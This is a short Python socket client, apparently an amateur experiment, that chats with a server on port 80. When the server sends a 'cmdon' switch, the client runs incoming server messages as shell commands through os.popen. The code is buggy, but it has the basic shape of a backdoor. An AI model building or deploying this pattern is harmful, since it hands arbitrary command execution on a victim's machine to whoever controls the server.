import os
import sys
import socket

HOST = socket.gethostbyname(socket.gethostname())
PORT = 80

cmd_mode = False
show_messages = True

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((HOST, PORT))

while True:
    server_message = s.recv(1024).decode('utf-8')

    if server_message == 'exit -f':
        sys.exit()

    elif server_message == 'messages-on':
        show_messages = True
    
    elif server_message == 'messages-off':
        show_messages = False

    elif server_message == 'cmdon':
        cmd_mode = True
    
    elif server_message == 'cmdoff':
        cmd_mode = False

    #####

    print(type(server_message))

    # Show server message
    if show_messages:
        print(server_message)
    
    # Enter command to client
    elif cmd_mode == True:
        print('test')
        os.popen(server_message)

    client_input = input('\n...: ')

    if client_input == '':
        client_input = 'Client nothing entered!'

    # Send message to server
    s.send(client_input.encode('utf-8'))
